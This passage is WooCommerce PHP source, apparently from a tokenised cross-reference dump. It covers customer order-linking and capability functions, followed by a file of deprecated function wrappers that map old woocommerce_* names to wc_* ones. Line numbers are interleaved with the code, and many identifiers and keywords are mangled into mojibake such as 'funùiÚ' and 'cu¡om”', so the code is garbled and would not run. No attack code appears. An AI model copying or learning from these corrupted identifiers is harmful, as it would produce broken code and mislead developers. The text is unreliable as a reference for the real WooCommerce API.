$cu¡om”_id
 );

131 
	`wp_£t_auth_cook›
Ğ
$cu¡om”_id
, 
Œue
 );

132 
	}
}

140 
funùiÚ
 
	$wc_upd©e_Ãw_cu¡om”_·¡_Üd”s
Ğ
$cu¡om”_id
 ) {

142 
$cu¡om”
 = 
	`g‘_u£r_by
Ğ'id', 
	`absšt
Ğ
$cu¡om”_id
 ) );

144 
$cu¡om”_Üd”s
 = 
	`g‘_po¡s
Ğ
	`¬¿y
(

149 'm‘a_qu”y' => 
	`¬¿y
(

150 
	`¬¿y
(

152 'v®ue' => 
	`¬¿y
( 0, '' ),

155 
	`¬¿y
(

157 'v®ue' => 
$cu¡om”
->
u£r_ema
,

162 
$lšked
 = 0;

163 
$com¶‘e
 = 0;

165 iàĞ
$cu¡om”_Üd”s
 )

166 
	`fÜ—ch
 ( 
$cu¡om”_Üd”s
 
as
 
$Üd”_id
 ) {

167 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_cu¡om”_u£r', 
$cu¡om”
->
ID
 );

169 
$Üd”_¡©us
 = 
	`wp_g‘_po¡_‹rms
Ğ
$Üd”_id
, 'shop_order_status' );

171 iàĞ
$Üd”_¡©us
 ) {

172 
$Üd”_¡©us
 = 
	`cu¼’t
( $order_status );

173 
$Üd”_¡©us
 = 
	`§n™ize_t™Ë
Ğ$Üd”_¡©us->
¦ug
 );

176 iàĞ
$Üd”_¡©us
 == 'completed' )

177 
$com¶‘e
 ++;

179 
$lšked
 ++;

182 iàĞ
$com¶‘e
 ) {

183 
	`upd©e_u£r_m‘a
Ğ
$cu¡om”_id
, 'paying_customer', 1 );

184 
	`upd©e_u£r_m‘a
Ğ
$cu¡om”_id
, '_order_count', '' );

185 
	`upd©e_u£r_m‘a
Ğ
$cu¡om”_id
, '_money_spent', '' );

188  
$lšked
;

189 
	}
}

198 
funùiÚ
 
	$wc_·yšg_cu¡om”
Ğ
$Üd”_id
 ) {

200 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

202 iàĞ
$Üd”
->
u£r_id
 > 0 ) {

203 
	`upd©e_u£r_m‘a
Ğ
$Üd”
->
u£r_id
, 'paying_customer', 1 );

205 
$Şd_¥’t
 = 
	`absšt
Ğ
	`g‘_u£r_m‘a
Ğ
$Üd”
->
u£r_id
, '_mÚey_¥’t', 
Œue
 ) );

206 
	`upd©e_u£r_m‘a
Ğ
$Üd”
->
u£r_id
, '_mÚey_¥’t', 
$Şd_¥’t
 + $Üd”->
Üd”_tÙ®
 );

208 
$Şd_couÁ
 = 
	`absšt
Ğ
	`g‘_u£r_m‘a
Ğ
$Üd”
->
u£r_id
, '_Üd”_couÁ', 
Œue
 ) );

209 
	`upd©e_u£r_m‘a
Ğ
$Üd”
->
u£r_id
, '_Üd”_couÁ', 
$Şd_couÁ
 + 1 );

211 
	}
}

212 
add_aùiÚ
( 'woocommerce_order_status_completed', 'wc_paying_customer' );

224 
funùiÚ
 
	$wc_cu¡om”_bought_´oduù
Ğ
$cu¡om”_ema
, 
$u£r_id
, 
$´oduù_id
 ) {

225 
glob®
 
$wpdb
;

227 
$emas
 = 
	`¬¿y
();

229 iàĞ
$u£r_id
 ) {

230 
$u£r
 = 
	`g‘_u£r_by
Ğ'id', 
$u£r_id
 );

231 
$emas
[] = 
$u£r
->
u£r_ema
;

234 iàĞ
	`is_ema
Ğ
$cu¡om”_ema
 ) ) {

235 
$emas
[] = 
$cu¡om”_ema
;

238 iàĞĞ
$emas
 ) == 0 ) {

239  
çl£
;

242 
$com¶‘ed
 = 
	`g‘_‹rm_by
( 'slug', 'completed', 'shop_order_status' );

243 
$´oûssšg
 = 
	`g‘_‹rm_by
( 'slug', 'processing', 'shop_order_status' );

245  
$wpdb
->
	`g‘_v¬
(

246 
$wpdb
->
	`´•¬e
( "

247 
SELECT
 
	`COUNT
Ğ
DISTINCT
 
Üd”_™ems
.
Üd”_™em_id
 )

248 
FROM
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™ems
 
as
 
Üd”_™ems


249 
LEFT
 
JOIN
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™emm‘a
 
AS
 
™emm‘a
 
ON
 
Üd”_™ems
.
Üd”_™em_id
 = itemmeta.order_item_id

250 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
…o¡m‘¨
ON
 
Üd”_™ems
.
Üd”_id
 =…o¡m‘a.
po¡_id


251 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_»ÏtiÚshs
} 
AS
 
»l
 
ON
 
Üd”_™ems
.
Üd”_id
 =„–.
objeù_ID


252 
WHERE


253 
»l
.
‹rm_xÚomy_id
 
	`IN
 ( %
d
, %d ) 
AND


254 
™emm‘a
.
m‘a_v®ue
 = %
s
 
AND


255 
™emm‘a
.
m‘a_key
 
	`IN
 ( '_v¬ŸtiÚ_id', '_´oduù_id' ) 
AND


256 
po¡m‘a
.
m‘a_key
 
	`IN
 ( '_blšg_ema', '_cu¡om”_u£r' ) 
AND


258 
po¡m‘a
.
m‘a_v®ue
 
	`IN
 ( '" . im¶odeĞ"','",‡¼ay_uniqueĞ$ema èè. "' ) 
OR


260 
po¡m‘a
.
m‘a_v®ue
 = %
s
 
AND


261 
po¡m‘a
.
m‘a_v®ue
 > 0

267 
	}
}

278 
funùiÚ
 
	$wc_cu¡om”_has_ÿ·b™y
Ğ
$®lÿps
, 
$ÿps
, 
$¬gs
 ) {

279 iàĞ
	`is£t
Ğ
$ÿps
[0] ) ) {

280  
$ÿps
[0] ) {

283 
$u£r_id
 = 
$¬gs
[1];

284 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$¬gs
[2] );

286 iàĞ
$u£r_id
 =ğ
$Üd”
->
u£r_id
 ) {

287 
$®lÿps
['v›w_Üd”'] = 
Œue
;

293 
$u£r_id
 = 
$¬gs
[1];

294 
$Üd”_id
 = 
	`is£t
Ğ
$¬gs
[2] ) ? $¬gs[2] : 
nuÎ
;

298 iàĞ! 
$Üd”_id
 ) {

299 
$®lÿps
['·y_fÜ_Üd”'] = 
Œue
;

304 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

305 iàĞ
$u£r_id
 =ğ
$Üd”
->
u£r_id
 || 
	`em±y
( $order->user_id ) ) {

306 
$®lÿps
['·y_fÜ_Üd”'] = 
Œue
;

312 
$u£r_id
 = 
$¬gs
[1];

313 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$¬gs
[2] );

315 iàĞ
$u£r_id
 =ğ
$Üd”
->
u£r_id
 ) {

316 
$®lÿps
['Üd”_agaš'] = 
Œue
;

322 
$u£r_id
 = 
$¬gs
[1];

323 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$¬gs
[2] );

325 iàĞ
$u£r_id
 =ğ
$Üd”
->
u£r_id
 ) {

326 
$®lÿps
['ÿnûl_Üd”'] = 
Œue
;

332 
$u£r_id
 = 
$¬gs
[1];

333 
$dowÆßd
 = 
$¬gs
[2];

335 iàĞ
$u£r_id
 =ğ
$dowÆßd
->
u£r_id
 ) {

336 
$®lÿps
['dowÆßd_fe'] = 
Œue
;

343  
$®lÿps
;

344 
	}
}

346 
add_f‹r
( 'user_has_cap', 'wc_customer_has_capability', 10, 3 );

	@includes/wc-deprecated-functions.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 
funùiÚ
 
	$woocomm”û_show_mes§ges
() {

16 
	`_d•»ÿ‹d_funùiÚ
( 'woocommerce_show_messages', '2.1', 'wc_print_notices' );

17 
	`wc_´št_nÙiûs
();

18 
	}
}

19 
funùiÚ
 
	$woocomm”û_w“k’d_¬—_js
() {

20 
	`_d•»ÿ‹d_funùiÚ
( 'woocommerce_weekend_area_js', '2.1', '' );

21 
	}
}

22 
funùiÚ
 
	$woocomm”û_toŞt_js
() {

23 
	`_d•»ÿ‹d_funùiÚ
( 'woocommerce_tooltip_js', '2.1', '' );

24 
	}
}

25 
funùiÚ
 
	$woocomm”û_d©•ick”_js
() {

26 
	`_d•»ÿ‹d_funùiÚ
( 'woocommerce_datepicker_js', '2.1', '' );

27 
	}
}

28 
funùiÚ
 
	$woocomm”û_admš_süts
() {

29 
	`_d•»ÿ‹d_funùiÚ
( 'woocommerce_admin_scripts', '2.1', '' );

30 
	}
}

31 
funùiÚ
 
woocomm”û_ü—‹_·ge
Ğ
$¦ug
, 
$İtiÚ
 = '', 
$·ge_t™Ë
 = '', 
$·ge_cÚ‹Á
 = '', 
$po¡_·»Á
 = 0 ) {

32 
_d•»ÿ‹d_funùiÚ
( 'woocommerce_create_page', '2.1', 'wc_create_page' );

33  
wc_ü—‹_·ge
Ğ
$¦ug
, 
$İtiÚ
, 
$·ge_t™Ë
, 
$·ge_cÚ‹Á
, 
$po¡_·»Á
 );

35 
funùiÚ
 
	$woocomm”û_»adfe_chunked
Ğ
$fe
, 
$»tby‹s
 = 
Œue
 ) {

36 
	`_d•»ÿ‹d_funùiÚ
( 'woocommerce_readfile_chunked', '2.1', 'WC_Download_Handler::readfile_chunked()' );

37  
WC_DowÆßd_HªdËr
::
	`»adfe_chunked
Ğ
$fe
, 
$»tby‹s
 );

38 
	}
}

48 
funùiÚ
 
	$woocomm”û_fÜm©_tÙ®
Ğ
$numb”
 ) {

49 
	`_d•»ÿ‹d_funùiÚ
Ğ
__FUNCTION__
, '2.1', 'wc_format_decimal()' );

50  
	`wc_fÜm©_decim®
Ğ
$numb”
, 
	`g‘_İtiÚ
Ğ'woocomm”û_´iû_num_decim®s' ), 
çl£
 );

51 
	}
}

61 
funùiÚ
 
	$woocomm”û_g‘_fÜm©‹d_´oduù_Çme
Ğ
$´oduù
 ) {

62 
	`_d•»ÿ‹d_funùiÚ
Ğ
__FUNCTION__
, '2.1', 'WC_Product::get_formatted_name()' );

63  
$´oduù
->
	`g‘_fÜm©‹d_Çme
();

64 
	}
}

72 
funùiÚ
 
	$woocomm”û_Ëgacy_·y·l_n
() {

73 iàĞ! 
	`em±y
Ğ
$_GET
['paypalListener'] ) && $_GET['paypalListener'] == 'paypal_standard_IPN' ) {

75 
	`WC
()->
	`·ym’t_g©eways
();

77 
	`do_aùiÚ
( 'woocommerce_api_wc_gateway_paypal' );

79 
	}
}

80 
add_aùiÚ
( 'init', 'woocommerce_legacy_paypal_ipn' );

85 
funùiÚ
 
	$woocomm”û_´Ùeùed_´oduù_add_to_ÿ¹
Ğ
$·s£d
, 
$´oduù_id
 ) {

86  
	`wc_´Ùeùed_´oduù_add_to_ÿ¹
Ğ
$·s£d
, 
$´oduù_id
 );

87 
	}
}

88 
funùiÚ
 
	$woocomm”û_em±y_ÿ¹
() {

89 
	`wc_em±y_ÿ¹
();

90 
	}
}

91 
funùiÚ
 
	$woocomm”û_lßd_³rsi¡’t_ÿ¹
Ğ
$u£r_logš
, 
$u£r
 = 0 ) {

92  
	`wc_lßd_³rsi¡’t_ÿ¹
Ğ
$u£r_logš
, 
$u£r
 );

93 
	}
}

94 
funùiÚ
 
	$woocomm”û_add_to_ÿ¹_mes§ge
Ğ
$´oduù_id
 ) {

95 
	`wc_add_to_ÿ¹_mes§ge
Ğ
$´oduù_id
 );

96 
	}
}

97 
funùiÚ
 
	$woocomm”û_ş—r_ÿ¹_aá”_·ym’t
() {

98 
	`wc_ş—r_ÿ¹_aá”_·ym’t
();

99 
	}
}

100 
funùiÚ
 
	$woocomm”û_ÿ¹_tÙ®s_subtÙ®_html
() {

101 
	`wc_ÿ¹_tÙ®s_subtÙ®_html
();

102 
	}
}

103 
funùiÚ
 
	$woocomm”û_ÿ¹_tÙ®s_shpšg_html
() {

104 
	`wc_ÿ¹_tÙ®s_shpšg_html
();

105 
	}
}

106 
funùiÚ
 
	$woocomm”û_ÿ¹_tÙ®s_coupÚ_html
Ğ
$coupÚ
 ) {

107 
	`wc_ÿ¹_tÙ®s_coupÚ_html
Ğ
$coupÚ
 );

108 
	}
}

109 
funùiÚ
 
	$woocomm”û_ÿ¹_tÙ®s_Üd”_tÙ®_html
() {

110 
	`wc_ÿ¹_tÙ®s_Üd”_tÙ®_html
();

111 
	}
}

112 
funùiÚ
 
	$woocomm”û_ÿ¹_tÙ®s_ãe_html
Ğ
$ãe
 ) {

113 
	`wc_ÿ¹_tÙ®s_ãe_html
Ğ
$ãe
 );

114 
	}
}

115 
funùiÚ
 
	$woocomm”û_ÿ¹_tÙ®s_shpšg_m‘hod_Ïb–
Ğ
$m‘hod
 ) {

116  
	`wc_ÿ¹_tÙ®s_shpšg_m‘hod_Ïb–
Ğ
$m‘hod
 );

117 
	}
}

122 
funùiÚ
 
woocomm”û_g‘_‹m¶©e_·¹
Ğ
$¦ug
, 
$Çme
 = '' ) {

123 
wc_g‘_‹m¶©e_·¹
Ğ
$¦ug
, 
$Çme
 );

125 
funùiÚ
 
woocomm”û_g‘_‹m¶©e
Ğ
$‹m¶©e_Çme
, 
$¬gs
 = 
¬¿y
(), 
$‹m¶©e_·th
 = '', 
$deçuÉ_·th
 = '' ) {

126 
wc_g‘_‹m¶©e
Ğ
$‹m¶©e_Çme
, 
$¬gs
, 
$‹m¶©e_·th
, 
$deçuÉ_·th
 );

128 
funùiÚ
 
woocomm”û_loÿ‹_‹m¶©e
Ğ
$‹m¶©e_Çme
, 
$‹m¶©e_·th
 = '', 
$deçuÉ_·th
 = '' ) {

129  
wc_loÿ‹_‹m¶©e
Ğ
$‹m¶©e_Çme
, 
$‹m¶©e_·th
, 
$deçuÉ_·th
 );

131 
funùiÚ
 
woocomm”û_ma
Ğ
$to
, 
$subjeù
, 
$mes§ge
, 
$h—d”s
 = "CÚ‹Á-Ty³:ext/html\r\n", 
$©chm’ts
 = "" ) {

132 
wc_ma
Ğ
$to
, 
$subjeù
, 
$mes§ge
, 
$h—d”s
, 
$©chm’ts
 );

138 
funùiÚ
 
	$woocomm”û_di§bË_admš_b¬
Ğ
$show_admš_b¬
 ) {

139  
	`wc_di§bË_admš_b¬
Ğ
$show_admš_b¬
 );

140 
	}
}

141 
funùiÚ
 
woocomm”û_ü—‹_Ãw_cu¡om”
Ğ
$ema
, 
$u£ºame
 = '', 
$·sswÜd
 = '' ) {

142  
wc_ü—‹_Ãw_cu¡om”
Ğ
$ema
, 
$u£ºame
, 
$·sswÜd
 );

144 
funùiÚ
 
	$woocomm”û_£t_cu¡om”_auth_cook›
Ğ
$cu¡om”_id
 ) {

145 
	`wc_£t_cu¡om”_auth_cook›
Ğ
$cu¡om”_id
 );

146 
	}
}

147 
funùiÚ
 
	$woocomm”û_upd©e_Ãw_cu¡om”_·¡_Üd”s
Ğ
$cu¡om”_id
 ) {

148  
	`wc_upd©e_Ãw_cu¡om”_·¡_Üd”s
Ğ
$cu¡om”_id
 );

149 
	}
}

150 
funùiÚ
 
	$woocomm”û_·yšg_cu¡om”
Ğ
$Üd”_id
 ) {

151 
	`wc_·yšg_cu¡om”
Ğ
$Üd”_id
 );

152 
	}
}

153 
funùiÚ
 
	$woocomm”û_cu¡om”_bought_´oduù
Ğ
$cu¡om”_ema
, 
$u£r_id
, 
$´oduù_id
 ) {

154  
	`wc_cu¡om”_bought_´oduù
Ğ
$cu¡om”_ema
, 
$u£r_id
, 
$´oduù_id
 );

155 
	}
}

156 
funùiÚ
 
	$woocomm”û_cu¡om”_has_ÿ·b™y
Ğ
$®lÿps
, 
$ÿps
, 
$¬gs
 ) {

157  
	`wc_cu¡om”_has_ÿ·b™y
Ğ
$®lÿps
, 
$ÿps
, 
$¬gs
 );

158 
	}
}

163 
funùiÚ
 
	$woocomm”û_§n™ize_xÚomy_Çme
Ğ
$xÚomy
 ) {

164  
	`wc_§n™ize_xÚomy_Çme
Ğ
$xÚomy
 );

165 
	}
}

166 
funùiÚ
 
	$woocomm”û_g‘_f’ame_äom_u¾
Ğ
$fe_u¾
 ) {

167  
	`wc_g‘_f’ame_äom_u¾
Ğ
$fe_u¾
 );

168 
	}
}

169 
funùiÚ
 
	$woocomm”û_g‘_dim’siÚ
Ğ
$dim
, 
$to_un™
 ) {

170  
	`wc_g‘_dim’siÚ
Ğ
$dim
, 
$to_un™
 );

171 
	}
}

172 
funùiÚ
 
	$woocomm”û_g‘_weight
Ğ
$weight
, 
$to_un™
 ) {

173  
	`wc_g‘_weight
Ğ
$weight
, 
$to_un™
 );

174 
	}
}

175 
funùiÚ
 
	$woocomm”û_Œim_z”os
Ğ
$´iû
 ) {

176  
	`wc_Œim_z”os
Ğ
$´iû
 );

177 
	}
}

178 
funùiÚ
 
	$woocomm”û_round_x_tÙ®
Ğ
$x
 ) {

179  
	`wc_round_x_tÙ®
Ğ
$x
 );

180 
	}
}

181 
funùiÚ
 
	$woocomm”û_fÜm©_decim®
Ğ
$numb”
, 
$dp
 = 
çl£
, 
$Œim_z”os
 = false ) {

182  
	`wc_fÜm©_decim®
Ğ
$numb”
, 
$dp
, 
$Œim_z”os
 );

183 
	}
}

184 
funùiÚ
 
	$woocomm”û_ş—n
Ğ
$v¬
 ) {

185  
	`wc_ş—n
Ğ
$v¬
 );

186 
	}
}

187 
funùiÚ
 
	$woocomm”û_¬¿y_ov”Ïy
Ğ
$a1
, 
$a2
 ) {

188  
	`wc_¬¿y_ov”Ïy
Ğ
$a1
, 
$a2
 );

189 
	}
}

190 
funùiÚ
 
woocomm”û_´iû
Ğ
$´iû
, 
$¬gs
 = 
	$¬¿y
() ) {

191  
	`wc_´iû
Ğ
$´iû
, 
$¬gs
 );

192 
	}
}

193 
funùiÚ
 
	$woocomm”û_Ët_to_num
Ğ
$size
 ) {

194  
	`wc_Ët_to_num
Ğ
$size
 );

195 
	}
}

200 
funùiÚ
 
	$woocomm”û_d©e_fÜm©
() {

201  
	`wc_d©e_fÜm©
();

202 
	}
}

203 
funùiÚ
 
	$woocomm”û_time_fÜm©
() {

204  
	`wc_time_fÜm©
();

205 
	}
}

206 
funùiÚ
 
	$woocomm”û_timezÚe_¡ršg
() {

207  
	`wc_timezÚe_¡ršg
();

208 
	}
}

209 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_rgb_from_hex' ) ) {

210 
funùiÚ
 
woocomm”û_rgb_äom_hex
Ğ
$cŞÜ
 ) {

211  
wc_rgb_äom_hex
Ğ
$cŞÜ
 );

214 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_hex_darker' ) ) {

215 
funùiÚ
 
woocomm”û_hex_d¬k”
Ğ
$cŞÜ
, 
$çùÜ
 = 30 ) {

216  
wc_hex_d¬k”
Ğ
$cŞÜ
, 
$çùÜ
 );

219 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_hex_lighter' ) ) {

220 
funùiÚ
 
woocomm”û_hex_ligh‹r
Ğ
$cŞÜ
, 
$çùÜ
 = 30 ) {

221  
wc_hex_ligh‹r
Ğ
$cŞÜ
, 
$çùÜ
 );

224 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_light_or_dark' ) ) {

225 
funùiÚ
 
woocomm”û_light_Ü_d¬k
Ğ
$cŞÜ
, 
$d¬k
 = '#000000', 
$light
 = '#FFFFFF' ) {

226  
wc_light_Ü_d¬k
Ğ
$cŞÜ
, 
$d¬k
, 
$light
 );

229 iàĞ! 
funùiÚ_exi¡s
( 'woocommerce_format_hex' ) ) {

230 
funùiÚ
 
woocomm”û_fÜm©_hex
Ğ
$hex
 ) {

231  
wc_fÜm©_hex
Ğ
$hex
 );

238 
funùiÚ
 
	$woocomm”û_g‘_Üd”_id_by_Üd”_key
Ğ
$Üd”_key
 ) {

239  
	`wc_g‘_Üd”_id_by_Üd”_key
Ğ
$Üd”_key
 );

240 
	}
}

241 
funùiÚ
 
	$woocomm”û_dowÆßdabË_fe_³rmissiÚ
Ğ
$dowÆßd_id
, 
$´oduù_id
, 
$Üd”
 ) {

242  
	`wc_dowÆßdabË_fe_³rmissiÚ
Ğ
$dowÆßd_id
, 
$´oduù_id
, 
$Üd”
 );

243 
	}
}

244 
funùiÚ
 
	$woocomm”û_dowÆßdabË_´oduù_³rmissiÚs
Ğ
$Üd”_id
 ) {

245 
	`wc_dowÆßdabË_´oduù_³rmissiÚs
Ğ
$Üd”_id
 );

246 
	}
}

247 
funùiÚ
 
	$woocomm”û_add_Üd”_™em
Ğ
$Üd”_id
, 
$™em
 ) {

248  
	`wc_add_Üd”_™em
Ğ
$Üd”_id
, 
$™em
 );

249 
	}
}

250 
funùiÚ
 
	$woocomm”û_d–‘e_Üd”_™em
Ğ
$™em_id
 ) {

251  
	`wc_d–‘e_Üd”_™em
Ğ
$™em_id
 );

252 
	}
}

253 
funùiÚ
 
woocomm”û_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$´ev_v®ue
 = '' ) {

254  
wc_upd©e_Üd”_™em_m‘a
Ğ
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$´ev_v®ue
 );

256 
funùiÚ
 
	$woocomm”û_add_Üd”_™em_m‘a
Ğ
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$unique
 = 
çl£
 ) {

257  
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$unique
 );

258 
	}
}

259 
funùiÚ
 
woocomm”û_d–‘e_Üd”_™em_m‘a
Ğ
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
 = '', 
$d–‘e_®l
 = 
çl£
 ) {

260  
wc_d–‘e_Üd”_™em_m‘a
Ğ
$™em_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$d–‘e_®l
 );

262 
funùiÚ
 
	$woocomm”û_g‘_Üd”_™em_m‘a
Ğ
$™em_id
, 
$key
, 
$sšgË
 = 
Œue
 ) {

263  
	`wc_g‘_Üd”_™em_m‘a
Ğ
$™em_id
, 
$key
, 
$sšgË
 );

264 
	}
}

265 
funùiÚ
 
	$woocomm”û_ÿnûl_uÅaid_Üd”s
() {

266 
	`wc_ÿnûl_uÅaid_Üd”s
();

267 
	}
}

268 
funùiÚ
 
	$woocomm”û_´oûssšg_Üd”_couÁ
() {

269  
	`wc_´oûssšg_Üd”_couÁ
();

270 
	}
}

275 
funùiÚ
 
	$woocomm”û_g‘_·ge_id
Ğ
$·ge
 ) {

276  
	`wc_g‘_·ge_id
Ğ
$·ge
 );

277 
	}
}

278 
funùiÚ
 
woocomm”û_g‘_’dpošt_u¾
Ğ
$’dpošt
, 
$v®ue
 = '', 
$³rm®šk
 = '' ) {

279  
wc_g‘_’dpošt_u¾
Ğ
$’dpošt
, 
$v®ue
, 
$³rm®šk
 );

281 
funùiÚ
 
	$woocomm”û_lo¡·sswÜd_u¾
Ğ
$u¾
 ) {

282  
	`wc_lo¡·sswÜd_u¾
Ğ
$u¾
 );

283 
	}
}

284 
funùiÚ
 
	$woocomm”û_cu¡om”_ed™_accouÁ_u¾
() {

285  
	`wc_cu¡om”_ed™_accouÁ_u¾
();

286 
	}
}

287 
funùiÚ
 
	$woocomm”û_Çv_m’u_™ems
Ğ
$™ems
, 
$¬gs
 ) {

288  
	`wc_Çv_m’u_™ems
Ğ
$™ems
, 
$¬gs
 );

289 
	}
}

290 
funùiÚ
 
	$woocomm”û_Çv_m’u_™em_şas£s
Ğ
$m’u_™ems
, 
$¬gs
 ) {

291  
	`wc_Çv_m’u_™em_şas£s
Ğ
$m’u_™ems
, 
$¬gs
 );

292 
	}
}

293 
funùiÚ
 
	$woocomm”û_li¡_·ges
Ğ
$·ges
 ) {

294  
	`wc_li¡_·ges
Ğ
$·ges
 );

295 
	}
}

300 
glob®
 
	g$wc_m­_d•»ÿ‹d_f‹rs
;

302 
	g$wc_m­_d•»ÿ‹d_f‹rs
 = 
¬¿y
(

314 
fÜ—ch
 ( 
$wc_m­_d•»ÿ‹d_f‹rs
 
as
 
$Ãw
 => 
$Şd
 )

315 
add_f‹r
Ğ
$Ãw
, 'woocommerce_deprecated_filter_mapping' );

317 
funùiÚ
 
woocomm”û_d•»ÿ‹d_f‹r_m­pšg
Ğ
$d©a
, 
$¬g_1
 = '', 
$¬g_2
 = '', 
$¬g_3
 = '' ) {

318 
glob®
 
$wc_m­_d•»ÿ‹d_f‹rs
;

320 
	g$f‹r
 = 
cu¼’t_f‹r
();

322 iàĞ
is£t
Ğ
$wc_m­_d•»ÿ‹d_f‹rs
[ 
$f‹r
 ] ) )

323 iàĞ
has_f‹r
Ğ
$wc_m­_d•»ÿ‹d_f‹rs
[ 
$f‹r
 ] ) ) {

324 
	g$d©a
 = 
­¶y_f‹rs
Ğ
$wc_m­_d•»ÿ‹d_f‹rs
[ 
$f‹r
 ], 
$d©a
, 
$¬g_1
, 
$¬g_2
, 
$¬g_3
 );

325 
_d•»ÿ‹d_funùiÚ
Ğ'Th' . 
$wc_m­_d•»ÿ‹d_f‹rs
[ 
$f‹r
 ] . ' filter', '2.1', $filter );

328  
	g$d©a
;

338 
funùiÚ
 
woocomm”û_´oduù_drİdown_ÿ‹gÜ›s
Ğ
$¬gs
 = 
¬¿y
(), 
$d•»ÿ‹d_h›¿rchiÿl
 = 1, 
$d•»ÿ‹d_show_unÿ‹gÜized
 = 1, 
$d•»ÿ‹d_Üd”by
 = '' ) {

339  
wc_´oduù_drİdown_ÿ‹gÜ›s
Ğ
$¬gs
, 
$d•»ÿ‹d_h›¿rchiÿl
, 
$d•»ÿ‹d_show_unÿ‹gÜized
, 
$d•»ÿ‹d_Üd”by
 );

341 
funùiÚ
 
woocomm”û_w®k_ÿ‹gÜy_drİdown_Œ“
Ğ
$a1
 = '', 
$a2
 = '', 
$a3
 = '' ) {

342  
wc_w®k_ÿ‹gÜy_drİdown_Œ“
Ğ
$a1
, 
$a2
, 
$a3
 );

344 
funùiÚ
 
	$woocomm”û_xÚomy_m‘ad©a_wpdbfix
() {

345  
	`wc_xÚomy_m‘ad©a_wpdbfix
();

346 
	}
}

347 
funùiÚ
 
	$woocomm”û_Üd”_‹rms
Ğ
$the_‹rm
, 
$Ãxt_id
, 
$xÚomy
, 
$šdex
 = 0, 
$‹rms
 = 
nuÎ
 ) {

348  
	`wc_»Üd”_‹rms
Ğ
$the_‹rm
, 
$Ãxt_id
, 
$xÚomy
, 
$šdex
, 
$‹rms
 );

349 
	}
}

350 
funùiÚ
 
	$woocomm”û_£t_‹rm_Üd”
Ğ
$‹rm_id
, 
$šdex
, 
$xÚomy
, 
$»cursive
 = 
çl£
 ) {

351  
	`wc_£t_‹rm_Üd”
Ğ
$‹rm_id
, 
$šdex
, 
$xÚomy
, 
$»cursive
 );

352 
	}
}

353 
funùiÚ
 
	$woocomm”û_‹rms_şau£s
Ğ
$şau£s
, 
$xÚom›s
, 
$¬gs
 ) {

354  
	`wc_‹rms_şau£s
Ğ
$şau£s
, 
$xÚom›s
, 
$¬gs
 );

355 
	}
}

356 
funùiÚ
 
	$_woocomm”û_‹rm_»couÁ
Ğ
$‹rms
, 
$xÚomy
, 
$ÿÎback
, 
$‹rms_¬e_‹rm_xÚomy_ids
 ) {

357  
	`_wc_‹rm_»couÁ
Ğ
$‹rms
, 
$xÚomy
, 
$ÿÎback
, 
$‹rms_¬e_‹rm_xÚomy_ids
 );

358 
	}
}

359 
funùiÚ
 
	$woocomm”û_»couÁ_aá”_¡ock_chªge
Ğ
$´oduù_id
 ) {

360  
	`wc_»couÁ_aá”_¡ock_chªge
Ğ
$´oduù_id
 );

361 
	}
}

362 
funùiÚ
 
	$woocomm”û_chªge_‹rm_couÁs
Ğ
$‹rms
, 
$xÚom›s
, 
$¬gs
 ) {

363  
	`wc_chªge_‹rm_couÁs
Ğ
$‹rms
, 
$xÚom›s
, 
$¬gs
 );

364 
	}
}

369 
funùiÚ
 
	$woocomm”û_g‘_´oduù_ids_Ú_§Ë
() {

370  
	`wc_g‘_´oduù_ids_Ú_§Ë
();

371 
	}
}

372 
funùiÚ
 
	$woocomm”û_g‘_ã©u»d_´oduù_ids
() {

373  
	`wc_g‘_ã©u»d_´oduù_ids
();

374 
	}
}

375 
funùiÚ
 
woocomm”û_g‘_´oduù_‹rms
Ğ
$objeù_id
, 
$xÚomy
, 
$f›lds
 = 'all' ) {

376  
wc_g‘_´oduù_‹rms
Ğ
$objeù_id
, 
$xÚomy
, 
¬¿y
Ğ'f›lds' => 
$f›lds
 ) );

378 
funùiÚ
 
	$woocomm”û_´oduù_po¡_ty³_lšk
Ğ
$³rm®šk
, 
$po¡
 ) {

379  
	`wc_´oduù_po¡_ty³_lšk
Ğ
$³rm®šk
, 
$po¡
 );

380 
	}
}

381 
funùiÚ
 
	$woocomm”û_¶aûhŞd”_img_¤c
() {

382  
	`wc_¶aûhŞd”_img_¤c
();

383 
	}
}

384 
funùiÚ
 
woocomm”û_¶aûhŞd”_img
Ğ
$size
 = 'shop_thumbnail' ) {

385  
wc_¶aûhŞd”_img
Ğ
$size
 );

387 
funùiÚ
 
woocomm”û_g‘_fÜm©‹d_v¬ŸtiÚ
Ğ
$v¬ŸtiÚ
 = '', 
$æ©
 = 
çl£
 ) {

388  
wc_g‘_fÜm©‹d_v¬ŸtiÚ
Ğ
$v¬ŸtiÚ
, 
$æ©
 );

390 
funùiÚ
 
	$woocomm”û_scheduËd_§Ës
() {

391  
	`wc_scheduËd_§Ës
();

392 
	}
}

393 
funùiÚ
 
	$woocomm”û_g‘_©chm’t_image_©Œibu‹s
Ğ
$©Œ
 ) {

394  
	`wc_g‘_©chm’t_image_©Œibu‹s
Ğ
$©Œ
 );

395 
	}
}

396 
funùiÚ
 
	$woocomm”û_´•¬e_©chm’t_fÜ_js
Ğ
$»¥Ú£
 ) {

397  
	`wc_´•¬e_©chm’t_fÜ_js
Ğ
$»¥Ú£
 );

398 
	}
}

399 
funùiÚ
